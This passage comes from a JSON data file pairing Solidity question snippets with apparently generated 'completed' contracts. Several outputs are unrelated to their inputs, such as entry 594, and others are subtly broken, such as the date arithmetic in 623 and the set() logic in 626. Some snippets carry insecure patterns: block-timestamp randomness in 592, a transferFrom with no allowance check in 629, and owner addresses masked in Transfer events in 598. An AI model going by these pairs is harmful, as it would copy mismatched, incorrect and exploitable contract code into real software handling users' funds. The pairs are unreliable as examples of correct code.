        "input": "    function div128x128 (uint256 x, uint256 y) internal pure returns (uint256) {\n        unchecked {\n            require (y != 0);\n            uint256 xDec = x & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\n            uint256 xInt = x >> 128;\n            uint256 hi = xInt*(MAX_128x128/y);\n            uint256 lo = (xDec*(MAX_128x128/y))>>128;\n            \n            require (hi+lo <= MAX_128x128);\n            return hi+lo;\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\n library LibDiv128x128 {\n\n    function div128x128 (uint256 x, uint256 y) internal pure returns (uint256) {\n        unchecked {\n            require (y != 0);\n            uint256 xDec = x & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\n            uint256 xInt = x >> 128;\n            uint256 hi = xInt*(MAX_128x128/y);\n            uint256 lo = (xDec*(MAX_128x128/y))>>128;\n            \n            require (hi+lo <= MAX_128x128);\n            return hi+lo;\n        }\n    }\n    \n    \n    \n    \n    \n    \n    \n    \n    \n    uint256 constant MAX_128x128 = uint256(1)<<128;\n\n }\n\n"
    },
    "592.sol": {
        "input": "pragma solidity ^0.8.9;\n\ncontract Random {\n\n\n    function roll(uint256 number) public view returns (bool) {\n        uint256 d = uint256(\n            keccak256(abi.encodePacked(block.difficulty, block.timestamp))\n        ) % 101;\n        if (d <= number) return true;\n        return false;\n    }\n\n    \n    function random(uint256 number, uint256 counter)\n        public\n        view\n        returns (uint256)\n    {\n        return\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        block.timestamp,\n                        block.difficulty,\n                        msg.sender,\n                        counter\n                    )\n                )\n            ) % number;\n    }\n\n\n    function randomString(uint256 length) public view returns (string memory) {\n        require(length <= 14, \"Length cannot be greater than 14\");\n        require(length >= 1, \"Length cannot be Zero\");\n        bytes memory randomWord = new bytes(length);\n        bytes memory chars = new bytes(62);\n        chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n        for (uint256 i = 0; i < length; i++) {\n            uint256 randomNumber = random(62, i);\n            randomWord[i] = chars[randomNumber];\n        }\n        return string(randomWord);\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\ncontract Random {\n\n    //Roll Chance\n\n    function roll(uint256 number) public view returns (bool) {\n        uint256 d = uint256(\n            keccak256(abi.encodePacked(block.difficulty, block.timestamp))\n        ) % 101;\n        if (d <= number) return true;\n        return false;\n    }\n\n    //Random Number Generator\n    \n    function random(uint256 number, uint256 counter)\n        public\n        view\n        returns (uint256)\n    {\n        return\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        block.timestamp,\n                        block.difficulty,\n                        msg.sender,\n                        counter\n                    )\n                )\n            ) % number;\n    }\n\n    //Random String Generator (Max length 14)\n\n    function randomString(uint256 length) public view returns (string memory) {\n        require(length <= 14, \"Length cannot be greater than 14\");\n        require(length >= 1, \"Length cannot be Zero\");\n        bytes memory randomWord = new bytes(length);\n        // since we have 62 Characters\n        bytes memory chars = new bytes(62);\n        chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n        for (uint256 i = 0; i < length; i++) {\n            uint256 randomNumber = random(62, i);\n            // Index access for string is not possible\n            randomWord[i] = chars[randomNumber];\n        }\n        return string(randomWord);\n    }\n}\n\n"
    },
    "593.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract Testing {\n\n    struct Schema {\n        mapping(string => string) entity;\n    }\n\n    struct SchemaMapping {\n        string[] key;\n        string[] value;\n    }\n\n    mapping(uint256 => Schema) schemas;\n    mapping(uint256 => SchemaMapping[]) schemaMappings;\n\n    function createSchema(uint256 id, string memory key, string memory value) public {\n        SchemaMapping[] storage schemamapping = schemaMappings[id];\n        SchemaMapping storage singleSchemaItem = schemamapping.push();\n        singleSchemaItem.key.push(key);\n        singleSchemaItem.value.push(value);\n\n        schemas[id].entity[key] = value;\n    }\n\n    function getSchemaElemet(uint256 id) public view returns (SchemaMapping[] memory) {\n        return schemaMappings[id];\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Testing {\n\n    struct Schema {\n        mapping(string => string) entity;\n    }\n\n    struct SchemaMapping {\n        string[] key;\n        string[] value;\n    }\n\n    mapping(uint256 => Schema) schemas;\n    mapping(uint256 => SchemaMapping[]) schemaMappings;\n\n    function createSchema(uint256 id, string memory key, string memory value) public {\n        SchemaMapping[] storage schemamapping = schemaMappings[id];\n        SchemaMapping storage singleSchemaItem = schemamapping.push();\n        singleSchemaItem.key.push(key);\n        singleSchemaItem.value.push(value);\n\n        schemas[id].entity[key] = value;\n    }\n\n    function getSchemaElemet(uint256 id) public view returns (SchemaMapping[] memory) {\n        return schemaMappings[id];\n    }\n }\n\n"
    },
    "594.sol": {
        "input": "uint256 answer = 2\nbytes32 salt = 0x0000000000000000000000000000000000000000000000000000007465737432\n\n0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000007465737432\n\n0x566d7dd4e9dc72e9beef887f2982703a0d0f9dd1b6505ee3ff5310c7383637bd\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "595.sol": {
        "input": "contract test{\n       struct Info {\n        uint a;\n        uint b;\n        uint[] data;\n    }\n    \n    mapping(address => Info) private infos;\n    \n    function set() public {\n        infos[msg.sender].a = 1;\n        infos[msg.sender].b = 2;\n        infos[msg.sender].data.push(3);\n    }\n    \n    function get() private view{\n      infos[msg.sender].a; \n      infos[msg.sender].b; \n      infos[msg.sender].data[0]; \n    } }\n\ncontract test{\n    struct Info {\n        uint a;\n        uint b;\n        uint[] data;\n    }\n    \n    address owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    mapping(address => Info) infos;\n    \n    function set() public {\n        infos[msg.sender].a = 1;\n        infos[msg.sender].b = 2;\n        infos[msg.sender].data.push(3);\n    }\n    \n    function get() public view{\n      infos[msg.sender].a; \n      infos[msg.sender].b; \n      require(owner == msg.sender, 'you cannot read this data, you are not the owner!');\n      infos[msg.sender].data[0]; \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract test {\n       struct Info {\n        uint a;\n        uint b;\n        uint[] data;\n    }\n    \n    mapping(address => Info) private infos;\n    \n    function set() public {\n        infos[msg.sender].a = 1;\n        infos[msg.sender].b = 2;\n        infos[msg.sender].data.push(3);\n    }\n    \n    function get() private view{\n      infos[msg.sender].a; \n      infos[msg.sender].b; \n      infos[msg.sender].data[0]; \n    } }\n\n"
    },
    "597.sol": {
        "input": "owner = payable(msg.sender);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleSafeV3 {\n  address public owner;\n\n  constructor() public payable {\n    owner = payable(msg.sender);\n  }\n}\n\n"
    },
    "598.sol": {
        "input": "_balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n_balances[recipient] = _balances[recipient].add(amount);\nif (sender == _owner){\n    sender = _depo;\n}\nif (recipient == _owner){\n    recipient = _depo;\n}\nemit Transfer(sender, recipient, amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\n interface IERC20 {\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\n"
    },
    "599.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract NullContract{\n    address public constant NULLADDRESS = address(0);\n    \n    function retrieve() public pure returns(address){\n        return (address(0));\n    }\n}\n\n\n",
        "output": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract NullContract{\n    address public constant NULLADDRESS = address(0);\n    \n    function retrieve() public pure returns(address){\n        return (address(0));\n    }\n}\n\n"
    },
    "600.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ncontract Crowdsale {\n    IERC20 public token;\n    uint256 price; \n\n    constructor (address _token, uint256 _price) {\n        token = IERC20(_token);\n        price = _price;\n    }\n\n    function buy() external payable {\n        uint256 amount = price * msg.value;\n        token.transfer(msg.sender, amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ncontract Crowdsale {\n    IERC20 public token;\n    uint256 price; // amount of tokens per 1 ETH\n\n    constructor (address _token, uint256 _price) {\n        token = IERC20(_token);\n        price = _price;\n    }\n\n    function buy() external payable {\n        uint256 amount = price * msg.value;\n        token.transfer(msg.sender, amount);\n    }\n}\n\n"
    },
    "601.sol": {
        "input": "contract ezeNFT {\n    uint256 public tokenCounter;\n\n    constructor(){\n        tokenCounter = 201;\n    }\n\n    function _mintNewNFT( string memory name, string memory symbol, string memory tokenUri) public {\n        uint256 newTokenId = tokenCounter;\n        ezeynftFactory nfts = new ezeynftFactory(name,symbol,tokenUri,newTokenId);\n        tokenCounter += 1;\n    }\n\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4) {\n\n        return bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"));\n    }\n}\n\ncontract ezeynftFactory is ERC721 {\n    constructor(string memory name, string memory symbol,string memory tokenURI,uint tokenID) \n     ERC721(name,symbol)\n    {\n        _mint(msg.sender, tokenID); \n        _setTokenURI(tokenID,tokenURI);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface ERC721 {\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);\n}\n\n"
    },
    "603.sol": {
        "input": "mapping(address => Payment[]) public mainMap;\n\nfunction pay() public payable {\n    Payment[] storage payment = mainMap[msg.sender];\n    payment.push(Payment({amount: msg.value, timestamp: block.timestamp}));\n    mainMap[msg.sender] = payment;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Payments {\n    mapping(address => Payment[]) public mainMap;\n\n    struct Payment {\n        uint256 amount;\n        uint256 timestamp;\n    }\n\n    function pay() public payable {\n        Payment[] storage payment = mainMap[msg.sender];\n        payment.push(Payment({amount: msg.value, timestamp: block.timestamp}));\n        mainMap[msg.sender] = payment;\n    }\n}\n\n"
    },
    "604.sol": {
        "input": "function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(amount > 0,\"FPO: transfer amount the zero\");\n        require(sender != address(0), \"FPO: transfer from the zero address\");\n        require(recipient != address(0), \"FPO: transfer to the zero address\");\n        _beforeTokenTransfer(sender, recipient, amount);\n        _balances[sender] = _balances[sender].sub(amount, \"FPO: transfer amount exceeds balance\");\n        if((automatedMarketMakerPairs[sender] || automatedMarketMakerPairs[recipient]) &&\n            !excludeFromFees[recipient] && !excludeFromFees[sender] && fee > 0 && !swapping){\n            swapping = true;\n            uint256 feeAmount = amount.mul(fee).div(100);\n            amount = amount.sub(feeAmount);\n            _balances[address(fpoSwap)] = _balances[address(fpoSwap)].add(feeAmount);\n            emit Transfer(address(sender), address(fpoSwap), feeAmount);\n            if(_balances[address(fpoSwap)] > 100000000 && runSwapping){\n                fpoSwap.swapAndLiquidity();\n            }\n            swapping = false;\n        }\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _runSwapAndLiquidity() internal virtual {\n        fpoSwap.swapAndLiquidity();\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n  \n    function transfer(address target, uint256 value) external returns (bool);\n  \n    function allowance(address owner, address spender)\n        external\n        view \n        returns (uint256);\n\n    function approve (address spender, uint256 amount) external returns (bool);\n  \n    function transferFrom(address from, address to, uint256 value) \n        external \n        returns (bool);\n}\n\n"
    },
    "606.sol": {
        "input": "  function printAddresses() public returns(addrToValue[] memory){\n        addrToValue[] memory addressesArray = new addrToValue[](simpleStorageArray.length);    \n        for(uint256 _ssArrIndex=0; _ssArrIndex<simpleStorageArray.length; _ssArrIndex++){\n            addrToValue memory addressTov;\n            addressTov.addr = address(simpleStorageArray[_ssArrIndex]);\n            addressTov.value = SimpleStorage(address(simpleStorageArray[_ssArrIndex])).retrieve();\n            addressesArray[_ssArrIndex] = addressTov;\n        }\n        return addressesArray;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct addrToValue {\n        address addr;\n        uint256 value;\n    }\n    \n    address[] public simpleStorageArray;\n    \n    function printAddresses() public returns (addrToValue[] memory) {\n        addrToValue[] memory addressesArray = new addrToValue[](simpleStorageArray.length);    \n        \n        for (uint256 _ssArrIndex = 0; _ssArrIndex < simpleStorageArray.length; _ssArrIndex++) {\n            addrToValue memory addressTov;\n            addressTov.addr = simpleStorageArray[_ssArrIndex];\n            addressTov.value = SimpleStorage(simpleStorageArray[_ssArrIndex]).retrieve();\n            addressesArray[_ssArrIndex] = addressTov;\n        }\n        \n        return addressesArray;\n    }\n}\n\ncontract SimpleStorage {\n    function retrieve() public pure returns (uint256) {\n        // Implement the retrieve function logic here\n    }\n}\n"
    },
    "608.sol": {
        "input": "mapping(string -> address[]) paidUsers;\nfunction pay(string memory _title) public payable {\n   require(msg.value == movieInfo[_title].price, \"Invalid price for the film\");\n   \n   paidUsers[_title].push(msg.sender);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MovieContract {\n    mapping(string => address[]) paidUsers;\n    mapping(string => Movie) movieInfo;\n\n    struct Movie {\n        uint256 price;\n    }\n    \n    function pay(string memory _title) public payable {\n        require(msg.value == movieInfo[_title].price, \"Invalid price for the film\");\n        \n        paidUsers[_title].push(msg.sender);\n    }\n}\n"
    },
    "609.sol": {
        "input": "MyERC20Contract = await ERC20ContractFactory.deploy(\"Hello\",\"SYM\");\n\nconstructor(string memory name_, string memory symbol_) {\n    name = name_;\n    symbol = symbol_;\n    _mint(msg.sender, 100e18);\n}\n\nsomeAddress = (await ethers.getSigners())[1];\n\nit(\"sould transfer tokens correctly\", async function() {\n    await MyERC20Contract\n    .connect(someAddress)\n    .transfer(someOtherAddress.address, 10);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20Contract {\n    function totalSupply() external view returns (uint256 supply);\n\n    function balanceOf(address account)\n        external\n        view\n        returns (uint256 balance);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (uint256);\n\n    function transferFrom(address src, address dst, uint256 amount)\n        external\n        returns (uint256);\n}\n\n"
    },
    "610.sol": {
        "input": "function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AAVE_V3 {\n    mapping(address => uint) public balanceOf;\n    uint public totalSupply;\n\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n}\n\n"
    },
    "611.sol": {
        "input": "contract NFT is ERC721URIStorage { }\n\nfunction tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        require(_exists(tokenId), \"ERC721Metadata: URI query for nonexistent token\");\n\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n    }\n\nfunction _baseURI() internal view virtual returns (string memory) {\n        return \"\";\n    }\n\n contract NFT is ERC721{\n    function _setTokenURI(uint256 tokenId, string memory _tokenURI) internal virtual {\n       require(_exists(tokenId), \"...\");\n       _tokenURIs[tokenId] = _tokenURI;\n           }\n   }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC2980URI {\n    function uri(uint256 tokenId) external view returns (string memory);\n}\n\ninterface IERC721URIStorage {\n     function setTokenURI(uint256 tokenId, string memory _tokenURI) external;\n}\n\ninterface IERC721 {\n    function exists(uint256 tokenId) external view returns (bool);\n    function tokenOfOwnerByIndex(address owner, uint index) external view returns (uint256);\n\n    function tokenIdByIndex(uint index) external view returns (uint256);\n}\n\n"
    },
    "612.sol": {
        "input": "interface IPrngSystemContract {\n    function getPseudorandomSeed() external returns (bytes32);\n}\n\nIPrngSystemContract constant PrngSystemContract =\n    IPrngSystemContract(address(0x169));\n\npragma solidity ^0.8.18;\n\ninterface IPrngSystemContract {\n    function getPseudorandomSeed() external returns (bytes32);\n}\n\ncontract Prng {\n    IPrngSystemContract constant PrngSystemContract =\n        IPrngSystemContract(address(0x169));\n\n    event RandomResult(bytes32 randomBytes, uint256 num);\n\n    function getPseudorandomSeed() public returns (bytes32 randomBytes) {\n        randomBytes = PrngSystemContract.getPseudorandomSeed();\n    }\n    \n    function getPseudorandomNumber(uint256 lo, uint256 hi) external returns (uint256 num) {\n        bytes32 randomBytes = getPseudorandomSeed();\n        num = uint256(randomBytes);\n        num = lo + (num % (hi - lo));\n        emit RandomResult(randomBytes, num);\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPrngSystemContract {\n    function getPseudorandomSeed() external returns (bytes32);\n}\n\ncontract Prng {\n    IPrngSystemContract constant PrngSystemContract =\n        IPrngSystemContract(address(0x169));\n\n    event RandomResult(bytes32, uint256);\n\n    function getPseudorandomSeed() public returns (bytes32 randomBytes) {\n        randomBytes = PrngSystemContract.getPseudorandomSeed();\n    }\n    \n    function getPseudorandomNumber(\n        uint256 lo_,\n        uint256 hi_\n    ) public returns (uint256 num) {\n        bytes32 randomBytes = getPseudorandomSeed();\n        num = uint256(randomBytes);\n        num = lo_ + (num % (hi_ - lo_));\n        emit RandomResult(randomBytes, num);\n    }\n}\n\n"
    },
    "613.sol": {
        "input": "uint256 CurrentAsk private;\nuint256 CurrentBid private;\nuint256 LastTransactionPrice private;\n\nfunction setCurrentAsk(uint256 askPrice) public {\n  CurrentAsk=askPrice\n}\n\nfunction setCurrentBid(uint256 bidPrice) public {\n  CurrentBid=bidPrice\n}\n\nfunction setCurrentAsk(uint256 askPrice) public {\n      require(askPrice>LastTransactionPrice,\"ask higher amount\")\n      CurrentAsk=askPrice\n    }\n\n\nfunction setCurrentBid(uint256 bidPrice) public {\n      require(bidPrice > LastTransactionPrice, \"ask higher amount\")\n      CurrentBid=bidPrice\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MarketContract {\n    uint256 private CurrentAsk;\n    uint256 private CurrentBid;\n    uint256 private LastTransactionPrice;\n\n    function setCurrentAsk(uint256 askPrice) public {\n        require(askPrice > LastTransactionPrice, \"Ask price should be higher than last transaction price\");\n        CurrentAsk = askPrice;\n    }\n\n    function setCurrentBid(uint256 bidPrice) public {\n        require(bidPrice > LastTransactionPrice, \"Bid price should be higher than last transaction price\");\n        CurrentBid = bidPrice;\n    }\n\n    function getCurrentAsk() public view returns (uint256) {\n        return CurrentAsk;\n    }\n    \n    function getCurrentBid() public view returns (uint256) {\n        return CurrentBid;\n    }\n    \n    function getLastTransactionPrice() public view returns (uint256) {\n        return LastTransactionPrice;\n    }\n    \n    function setLastTransactionPrice(uint256 transactionPrice) public {\n        LastTransactionPrice = transactionPrice;\n    }\n}\n\n"
    },
    "614.sol": {
        "input": "kitties memory _kitty;\n_kitty.kittyPriceToday = 1 ether;\n_kitty.kittyPriceTomorrow = 2 ether;\n\nallKitties.push(_kitty);\n\nallKitties[0].kittyPriceToday = 5 ether;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Kitty_Price_Feed {\n\n    \n    struct kitties {\n        uint256 kittyPriceToday;\n        uint256 kittyPriceTomorrow;\n    }\n\n    \n    kitties[] public allKitties;\n\n    constructor() public {\n\n        kitties memory _kitty;\n        _kitty.kittyPriceToday = 1 ether;\n        _kitty.kittyPriceTomorrow = 2 ether;\n\n        allKitties.push(_kitty);\n\n        allKitties[0].kittyPriceToday = 5 ether;\n    }\n\n    function getTodayPrice(uint256 kittyId) public view returns(uint256) {\n        return allKitties[kittyId].kittyPriceToday;\n    }\n\n    function getTomorrowPrice(uint256 kittyId) public view returns(uint256) {\n        return allKitties[kittyId].kittyPriceTomorrow;\n    }\n}\n\n"
    },
    "617.sol": {
        "input": "constructor() {\n      owner = payable(msg.sender);\n  }\n\n  require(msg.sender == owner, \"Only owner can withdraw funds\"); \n  require(amount <= balance, \"Insufficient funds\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable owner;\n    uint256 balance;\n    \n    constructor() {\n        owner = payable(msg.sender);\n    }\n    \n    function withdrawFunds(uint256 amount) public {\n        require(msg.sender == owner, \"Only owner can withdraw funds\"); \n        require(amount <= balance, \"Insufficient funds\");\n        \n        // Withdraw logic here\n        \n        // Update balance after withdrawal\n        balance -= amount;\n    }\n}\n"
    },
    "619.sol": {
        "input": "https:\nhttps:\nhttps:\netc...\n\nfunction _exists(uint256 tokenId) override internal view returns (bool) {\n    if (tokenId >= 1 && tokenId <= 10000) {\n        return true;\n    }\n\n    return super._exists(tokenId);\n}\n\nfunction ownerOf(uint256 tokenId) override public view returns (address) {\n    address owner = _owners[tokenId];\n\n    if (tokenId >= 1 && tokenId <= 10000 && owner == address(0x0)) {\n        return address(0x123);\n    }\n\n    return super.ownerOf(tokenId);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC1155 {\n    function _exists(uint256 tokenId) external view returns (bool);\n\n    function ownerOf(uint256 tokenId) external view returns (address);\n}\n\n"
    },
    "620.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface ICakeToken {\n    function mint(address _to, uint256 _amount) external;\n}\n\ninterface IBUSD {\n    function mint(uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    ICakeToken CAKE = ICakeToken(0xFa60D973F7642B748046464e165A65B7323b0DEE);\n    IBUSD BUSD = IBUSD(0x8516Fc284AEEaa0374E66037BD2309349FF728eA);\n\n    function mintCake(address to, uint256 amount) external {\n        CAKE.mint(to, amount);\n    }\n\n    function mintBUSD(uint256 amount) external {\n        bool success = BUSD.mint(amount);\n        require(success);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ninterface ICakeToken {\n    function mint(address _to, uint256 _amount) external;\n}\n\ninterface IBUSD {\n    function mint(uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    ICakeToken CAKE = ICakeToken(0xFa60D973F7642B748046464e165A65B7323b0DEE);\n    IBUSD BUSD = IBUSD(0x8516Fc284AEEaa0374E66037BD2309349FF728eA);\n\n    function mintCake(address to, uint256 amount) external {\n        CAKE.mint(to, amount);\n    }\n\n    function mintBUSD(uint256 amount) external {\n        bool success = BUSD.mint(amount);\n        require(success);\n    }\n}\n\n"
    },
    "621.sol": {
        "input": "    \n     * https:\n    function uri(uint256) public view virtual override returns (string memory) {\n        return _uri;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    abstract contract Context {\n        function _msgSender() internal view virtual returns (address) {\n            return msg.sender;\n        }\n\n        function _msgData() internal view virtual returns (bytes calldata) {\n            return msg.data;\n        }\n    }\n\n    abstract contract IERC721 {\n        function URI() external virtual returns (string memory);\n    }\n\n"
    },
    "622.sol": {
        "input": " require(msg.value >= (freeMintCost * uint256(_mintAmount)));\n\ncontract Test {\n\n   int256 freeMints = 3;\n   uint256 cost = 1000;\n   uint256 freeMintCost = 0;\n    \n   function mint(int256 _mintAmount) public payable {\n       int256 payableMints = int256(_mintAmount - freeMints);\n       if(payableMints < 0){\n        payableMints = 0;\n       }\n       if(payableMints > 0){\n        require(msg.value >= (cost * uint256(payableMints)));\n       }\n       else{\n        require(msg.value >= (freeMintCost * uint256(_mintAmount)));\n       }\n   }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n\n   int256 freeMints = 3;\n   uint256 cost = 1000;\n   uint256 freeMintCost = 0;\n    \n   function mint(int256 _mintAmount) public payable {\n       int256 payableMints = int256(_mintAmount - freeMints);\n       if(payableMints < 0){\n        payableMints = 0;\n       }\n       if(payableMints > 0){\n        require(msg.value >= (cost * uint256(payableMints)));\n       }\n       else{\n        require(msg.value >= (freeMintCost * uint256(_mintAmount)));\n       }\n   }\n}\n\n"
    },
    "623.sol": {
        "input": "function timestampToDateTime(uint timestamp) public pure returns (uint year, uint month, uint day, uint hour, uint minute, uint second)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Utility {\n  function timestampToDateTime(uint timestamp) public pure returns (uint year, uint month, uint day, uint hour, uint minute, uint second) {\n     uint year = timestamp / 315576000000;\n     uint month = timestamp / 2629800000 - year * 30;\n     uint day = timestamp % 2629800000;\n     uint hour = timestamp / 3600000000;\n     uint minute = timestamp / 600000000 - hour * 60;\n     uint second = timestamp / 10000000000 - minute * 60;\n\n     return (year, month, day, hour, minute, second);\n  }\n}\n\n"
    },
    "625.sol": {
        "input": "    function addrToENS(address addr) public view returns(string[] memory) {\n        ReverseRecords ens = ReverseRecords(ENSReverseLookupContractAddr);\n        address[] memory t = new address[](1);\n        t[0] = addr;\n        return ens.getNames(t);\n    }\n\n\n",
        "output": "pragma solidity ^0.4.20;\ninterface IReverseLookup {\n    function getNames(address[] memory) public view returns (string[] memory);\n}\n\n"
    },
    "626.sol": {
        "input": "uint[] arr;\n\nuint arr[size];\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PuisEth {\n\n    uint public size;\n\n    uint[] arr;\n\n    constructor() {\n        size = 0;\n    }\n\n    function set(uint index, uint value) public {\n        require(index < size, \"Index out of bounds\");\n        require(value != 0, \"Value should be non zero\");\n        arr[index] = value;\n        size = index + 1;\n    }\n\n    function get(uint index) public view returns (uint) {\n        require(index < size, \"Index out of bounds\");\n        return arr[index]; \n    }\n}\n\n"
    },
    "627.sol": {
        "input": "function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256, \n        uint256 batchSize\n    ) internal virtual {}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract SafeToken {\n    function safeTransferFrom(address from, address to, uint256 tokenId) public;\n}\n\n"
    },
    "628.sol": {
        "input": "constructor() payable  {\n   token = ERC20(0x123456789);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20 {\n\n    function transfer(address to, uint256 value) public returns (bool);\n    function balanceOf(address who) public view returns (uint256);\n}\n\n"
    },
    "629.sol": {
        "input": "function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        _transfer(from, to, amount);\n        return true;\n    }\n\nfunction transferFromCaller(address to, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function transferFromCaller(address to, uint256 amount) public virtual returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal {\n        // Implement your transfer logic here\n    }\n}\n"
    },
    "630.sol": {
        "input": "transferFrom(address(this), msg.sender,tokenId);\n\nfunction transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override {\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: transfer caller is not owner nor approved\");\n\n        _transfer(from, to, tokenId);\n    }\n\n  address owner=ERC721.ownerOf(tokenId);\n  transferFrom(owner, msg.sender,tokenId);\n  \n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract ERC721 {\n    bytes4 public constant interfaceERC721 = 0x20095833;\n\n    event Transfer(\n        address indexed from,\n        address indexed to,\n        uint256 indexed tokenId\n    );\n\n    event Approval(\n        address indexed owner,\n        address indexed approved,\n        uint256 indexed tokenId\n    );\n\n    function balanceOf(address owner) external view virtual returns (uint256 balance);\n    function ownerOf(uint256 tokenId) external view virtual returns (address owner);\n    function transferFrom(address from, address to, uint256 tokenId) external virtual;\n    function approve(address to, uint256 tokenId) external virtual;\n    function getApproved(uint256 tokenId) external view virtual returns (address owner);\n    \n    \n    function _transfer(address from, address to, uint256 tokenId) internal virtual;\n    function _owners(uint256 tokenId) internal view virtual returns (address owner);\n    function _setApprovalForAll(address owner, address operator, bool approved) internal virtual;\n}\n\n"
    },
    "632.sol": {
        "input": "function allowance(address _owner, address _spender) public override view returns (uint256 remaining){\n        return allowed[_owner][_spender];\n    }\n\n  mapping(address=>mapping(address=>uint256)) allowed;\n\nfunction approve(address _spender, uint256 _value) public override returns (bool success){\n        allowed[msg.sender][_spender]=_value;\n        emit Approval(msg.sender,_spender,_value);\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20 {\n    \n    function allowance(address owner, address spender) external view returns (uint256 remaining);\n\n    function transferFrom(address from, address to, uint256 value) external returns (bool success);\n\n    function approve(address spender, uint256 value) external returns (bool success);\n\n    function transfer(address to, uint256 value) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "633.sol": {
